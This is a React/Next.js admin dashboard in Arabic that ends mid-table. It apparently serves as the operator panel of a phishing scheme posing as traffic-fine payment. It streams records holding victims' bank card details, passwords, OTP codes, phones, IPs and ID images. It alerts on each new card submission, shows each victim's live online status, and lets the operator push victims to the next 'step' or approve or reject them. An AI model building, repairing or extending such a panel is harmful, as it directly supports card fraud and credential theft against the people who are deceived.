"use client"
import type React from "react"
import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  Clock,
  MapPin,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
  Zap,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow, format } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { toast } from "@/hooks/use-toast"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"

// Types
type FlagColor = "red" | "yellow" | "green" | null

interface Notification {
  createdDate: string
  bank?: string
  cardStatus?: string
  ip?: string
  id: string | "0"
  notificationCount: number
  page: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  year: string
  month: string
  pagename: string
  plateType: string
  phone: string
  flagColor?: string
  currentPage?: string
  amount?: string
  step?: number
  name?: string
  backImage?: string
  password?: string
  email?: string
  otp?: string
}

function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string
  value: string | number
  change: string
  changeType: "increase" | "decrease" | "neutral"
  icon: React.ElementType
  color: string
  trend?: number[]
}) {
  return (
    <Card className="group relative overflow-hidden border-0 shadow-sm hover:shadow-md bg-card transition-all duration-300 hover:border-primary/10">
      <CardHeader className="pb-3">
        <div className="flex items-start justify-between">
          <div className={`p-3 rounded-lg ${color} shadow-lg`}>
            <Icon className="h-5 w-5 text-white" />
          </div>
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-emerald-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-muted-foreground"
              }`}
            />
            <span
              className={`text-xs font-semibold ${
                changeType === "increase"
                  ? "text-emerald-600"
                  : changeType === "decrease"
                    ? "text-red-600"
                    : "text-muted-foreground"
              }`}
            >
              {change}
            </span>
          </div>
        </div>
      </CardHeader>
      <CardContent>
        <div className="space-y-2">
          <p className="text-sm font-medium text-muted-foreground">{title}</p>
          <p className="text-2xl font-bold text-foreground">{value}</p>
        </div>
      </CardContent>
    </Card>
  )
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-500 animate-pulse" : "bg-neutral-400"}`}
      />
      <Badge
        variant="outline"
        className={`text-xs font-medium ${
          status === "online"
            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300"
            : "bg-neutral-50 text-neutral-600 border-neutral-200 dark:bg-neutral-900/30 dark:text-neutral-400"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  )
}

function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: any
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-muted">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-amber-500 fill-amber-500"
                  : currentColor === "green"
                    ? "text-emerald-500 fill-emerald-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-3">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية" },
            { color: "yellow", label: "متوسط الأولوية" },
            { color: "green", label: "منخفض الأولوية" },
          ].map(({ color, label }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-transparent"
                    onClick={() => onColorChange(notificationId, color as FlagColor)}
                  >
                    <Flag
                      className={`h-4 w-4 ${
                        color === "red"
                          ? "text-red-500 fill-red-500"
                          : color === "yellow"
                            ? "text-amber-500 fill-amber-500"
                            : "text-emerald-500 fill-emerald-500"
                      }`}
                    />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-transparent"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-muted-foreground" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("")
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث..."
        className="pl-10 pr-4 bg-muted/50 border-border/50 focus:border-primary/50 focus:ring-1 focus:ring-primary/20 transition-all"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
      />
    </div>
  )
}

function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
  totalItems: number
  itemsPerPage: number
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1
  const endItem = Math.min(currentPage * itemsPerPage, totalItems)

  return (
    <div className="flex items-center justify-between">
      <div className="text-sm text-muted-foreground font-medium">
        عرض {startItem} إلى {endItem} من {totalItems} عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1 text-xs"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
            const page = i + 1
            return (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0 text-xs"
                onClick={() => onPageChange(page)}
              >
                {page}
              </Button>
            )
          })}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1 text-xs"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  )
}

function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notifications: Notification[]
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)

    setTimeout(() => {
      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      })
    }, 1500)
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      personalInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="personal-info" className="cursor-pointer">
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) =>
                    setExportFields({
                      ...exportFields,
                      cardInfo: checked as boolean,
                    })
                  }
                />
                <Label htmlFor="card-info" className="cursor-pointer">
                  معلومات البطاقة
                </Label>
              </div>
            </div>
          </div>

          <div className="rounded-lg bg-primary/5 border border-primary/20 p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-primary" />
              <p className="text-foreground/70 font-medium">سيتم تصدير {notifications.length} إشعار</p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            الإعدادات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-foreground">إشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards" className="font-medium">
                    إشعارات البطاقات الجديدة
                  </Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                </div>
                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users" className="font-medium">
                    إشعارات المستخدمين الجدد
                  </Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                </div>
                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
              </div>
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-foreground">التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh" className="font-medium">
                    تفعيل التحديث
                  </Label>
                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5">
                  <Label htmlFor="refresh-interval" className="font-medium">
                    الفترة الزمنية (ثانية)
                  </Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر الفترة" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم الحفظ",
                  description: "تم حفظ الإعدادات بنجاح",
                })
                onOpenChange(false)
              }}
            >
              حفظ
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
  const [showStatstics, setShowStatstics] = useState(true)

  const router = useRouter()
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsersCount(Math.floor(Math.random() * 100))
    }, 30000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  const totalVisitorsCount = notifications.length
  const cardSubmissionsCount = notifications.filter((n) => n.bank).length
  const approvedCount = notifications.filter((n) => n.status === "approved").length
  const pendingCount = notifications.filter((n) => n.status === "pending").length

  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.bank)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    }

    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification?.password?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term),
      )
    }

    filtered.sort((a, b) => {
      let aValue: any, bValue: any

      switch (sortBy) {
        case "date":
          aValue = new Date(a.createdDate)
          bValue = new Date(b.createdDate)
          break
        case "status":
          aValue = a.status
          bValue = b.status
          break
        case "country":
          aValue = a.country || ""
          bValue = b.country || ""
          break
        default:
          return 0
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1
      } else {
        return aValue < bValue ? 1 : -1
      }
    })

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm, sortBy, sortOrder])

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        const hasNewBankInfo = notificationsData.some(
          (notification) => notification.bank && !notifications.some((n) => n.id === notification.id && n.bank),
        )

        if (hasNewBankInfo) {
          playNotificationSound()
        }

        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    const totalCount = notificationsData.length
    const cardCount = notificationsData.filter((notification) => notification.bank).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }
  const handleShowStatstics = () => {
    setShowStatstics(!showStatstics)
  }
  const handleFlagColorChange = async (id: string, color: any) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم التحديث",
        description: color ? "تم تحديث العلامة" : "تمت إزالة العلامة",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء التحديث",
        variant: "destructive",
      })
    }
  }

  const handleStepUpdate = async (id: string, step: number) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { step: step })

      setNotifications(
        notifications.map((notification) => (notification.id === id ? { ...notification, step: step } : notification)),
      )

      toast({
        title: "تم التحديث",
        description: "تم تحديث الخطوة بنجاح",
      })
    } catch (error) {
      console.error("Error updating step:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الخطوة",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })
      toast({
        title: state === "approved" ? "موافق" : "مرفوض",
        description: state === "approved" ? "تمت الموافقة على الإشعار" : "تم رفض الإشعار",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء التحديث",
        variant: "destructive",
      })
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم الحذف",
        description: "تم مسح الإشعار بنجاح",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الحذف",
        variant: "destructive",
      })
    }
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast({
        title: "تم الحذف",
        description: "تم مسح جميع الإشعارات بنجاح",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  const handleRefresh = () => {
    setIsLoading(true)
    fetchNotifications()
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
          </div>
          <div className="text-sm font-medium text-muted-foreground">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  const visitorTrend = [5, 8, 12, 7, 10, 15, 13]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6]
  const approvedTrend = [1, 2, 4, 3, 5, 7, 6]

  return (
    <div dir="rtl" className="min-h-screen bg-background">
      <header className="sticky top-0 z-50 border-b border-border/50 bg-card/50 backdrop-blur-xl">
        <div className="flex items-center justify-between px-4 sm:px-6 py-4">
          <div className="flex items-center gap-4 flex-1">
            <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className="h-10 w-10 rounded-lg bg-gradient-to-br from-primary to-primary/70 flex items-center justify-center shadow-md">
                <Bell className="h-5 w-5 text-white" />
              </div>
              <div>
                <h1 className="text-lg font-bold text-foreground">الإشعارات</h1>
                <p className="text-xs text-muted-foreground">{format(new Date(), "HH:mm", { locale: ar })}</p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost" size="icon" onClick={handleRefresh}>
                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>تحديث</TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <div className="hidden md:flex items-center gap-2">
              <Button variant="ghost" size="icon" onClick={() => setSettingsOpen(true)}>
                <Settings className="h-4 w-4" />
              </Button>

              <Button variant="ghost" size="icon" onClick={() => setExportDialogOpen(true)}>
                <Download className="h-4 w-4" />
              </Button>

              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={notifications.length === 0}
                className="hidden sm:flex items-center gap-2 text-xs"
              >
                <Trash2 className="h-3 w-3" />
                <span className="hidden sm:inline">حذف</span>
              </Button>
            </div>

            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="ghost" className="relative h-9 w-9 rounded-lg">
                  <Avatar className="h-9 w-9">
                    <AvatarImage src="/placeholder.svg?height=36&width=36" alt="صورة المستخدم" />
                    <AvatarFallback className="bg-primary text-primary-foreground text-xs font-semibold">
                      مد
                    </AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-48">
                <DropdownMenuLabel className="text-xs">
                  <p className="text-xs font-medium">مدير النظام</p>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                  <Settings className="ml-2 h-4 w-4" />
                  <span className="text-xs">الإعدادات</span>
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
                  <Download className="ml-2 h-4 w-4" />
                  <span className="text-xs">تصدير</span>
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={handleLogout} className="text-red-600">
                  <LogOut className="ml-2 h-4 w-4" />
                  <span className="text-xs">خروج</span>
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <div className="p-4 sm:p-6">
        <div
          className={`grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-6 transition-all duration-300 ${
            showStatstics ? "" : "hidden"
          }`}
        >
          <StatisticsCard
            title="الزوار"
            value={totalVisitorsCount}
            change="+12%"
            changeType="increase"
            icon={Users}
            color="bg-blue-500"
            trend={visitorTrend}
          />
          <StatisticsCard
            title="متصلين"
            value={onlineUsersCount}
            change="+5%"
            changeType="increase"
            icon={UserCheck}
            color="bg-emerald-500"
            trend={onlineTrend}
          />
          <StatisticsCard
            title="البنك"
            value={cardSubmissionsCount}
            change="+8%"
            changeType="increase"
            icon={CreditCard}
            color="bg-purple-500"
            trend={cardTrend}
          />
          <StatisticsCard
            title="موافقات"
            value={approvedCount}
            change="+15%"
            changeType="increase"
            icon={CheckCircle}
            color="bg-emerald-600"
            trend={approvedTrend}
          />
        </div>

        <Card className="border-0 shadow-sm bg-card">
          <CardHeader className="pb-4 border-b border-border/50">
            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
              <div>
                <CardTitle className="text-2xl font-bold flex items-center gap-3">
                  <Zap className="h-5 w-5 text-primary" />
                  الإشعارات
                </CardTitle>
                <CardDescription className="mt-1 text-sm">إدارة وتتبع جميع الإشعارات والطلبات</CardDescription>
              </div>

              <div className="flex flex-col sm:flex-row gap-2">
                <SearchBar onSearch={handleSearch} />
                <div className="flex gap-2">
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="outline" size="sm" className="gap-2 text-xs bg-transparent">
                        <Filter className="h-4 w-4" />
                        فلتر
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setFilterType("all")}>جميع الإشعارات</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("card")}>البطاقات فقط</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("online")}>المتصلين فقط</DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>

                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="outline" size="sm" className="gap-2 text-xs bg-transparent">
                        <ArrowUpDown className="h-4 w-4" />
                        ترتيب
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setSortBy("date")}>التاريخ</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("status")}>الحالة</DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("country")}>الدولة</DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </div>
              </div>
            </div>

            {/* Filter Tabs */}
            <div className="flex flex-wrap gap-2 mt-4">
              <Button
                variant={filterType === "all" ? "default" : "outline"}
                onClick={() => setFilterType("all")}
                size="sm"
                className="gap-2 text-xs"
              >
                الكل
                <Badge variant="secondary" className="text-xs">
                  {notifications.length}
                </Badge>
              </Button>
              <Button
                variant={filterType === "card" ? "default" : "outline"}
                onClick={() => setFilterType("card")}
                size="sm"
                className="gap-2 text-xs"
              >
                <CreditCard className="h-3 w-3" />
                البنك
                <Badge variant="secondary" className="text-xs">
                  {cardSubmissionsCount}
                </Badge>
              </Button>
              <Button
                variant={filterType === "online" ? "default" : "outline"}
                onClick={() => setFilterType("online")}
                size="sm"
                className="gap-2 text-xs"
              >
                <UserCheck className="h-3 w-3" />
                متصلين
                <Badge variant="secondary" className="text-xs">
                  {onlineUsersCount}
                </Badge>
              </Button>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            {/* Desktop Table View */}
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border/50 bg-muted/30">
                    <th className="px-6 py-3 text-right font-semibold text-muted-foreground text-xs">الدولة</th>
